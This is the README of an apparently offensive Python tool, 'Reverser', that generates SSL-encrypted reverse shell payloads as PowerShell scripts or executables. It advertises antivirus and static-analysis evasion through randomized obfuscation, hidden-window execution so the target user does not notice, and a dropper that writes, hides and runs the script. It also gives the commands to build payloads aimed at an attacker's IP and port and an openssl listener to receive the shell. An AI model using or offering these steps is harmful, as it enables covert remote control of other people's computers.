# Reverser Tool

**Reverser** is a Python-based tool designed to generate reverse shell payloads with SSL encryption. The tool provides the ability to create either a PowerShell script (`.ps1`) or an executable file (`.exe`) that establishes a secure reverse shell connection to a specified IP address and port.

## Features

- **SSL Encryption**: The tool generates an SSL certificate and key to encrypt the reverse shell communication, enhancing security and bypassing basic network security measures.
- **Payload Generation**: Users can generate either a PowerShell script or an executable file. The payload is obfuscated to avoid detection by antivirus software.
- **Randomized Obfuscation**: The tool can randomize the obfuscation of the payload to further reduce the chance of detection by static analysis tools.
- **Hidden Execution**: Both the PowerShell script and the executable are designed to run in a hidden window, minimizing the likelihood of detection by the target user.
- **Auto-generated Files**: The executable file, when run, generates the PowerShell script on disk, hides it, and executes it to establish the reverse shell connection.
- **Customizable**: The IP address, port, and output file names can be customized through command-line arguments.

## Usage

1. **Generating an SSL Certificate**:
   The tool automatically generates an SSL certificate and key that will be used to encrypt the reverse shell communication.

2. **Generating a Payload**:
   - To generate a PowerShell script:
     ```bash
     python3 reverser.py -ip <Your_IP> -port <Your_Port> -type ps1
     ```
   - To generate an executable:
     ```bash
     python3 reverser.py -ip <Your_IP> -port <Your_Port> -type exe
     ```

3. **Randomized Obfuscation**:
   - To enable randomized obfuscation:
     ```bash
     python3 reverser.py -ip <Your_IP> -port <Your_Port> -type exe -random
     ```

4. **Starting an SSL Listener**:
   Once the payload is generated, start an OpenSSL listener on your machine to accept the reverse shell connection:
   ```bash
   openssl s_server -accept <Your_Port> -cert reception.pem -key reception.key -quiet
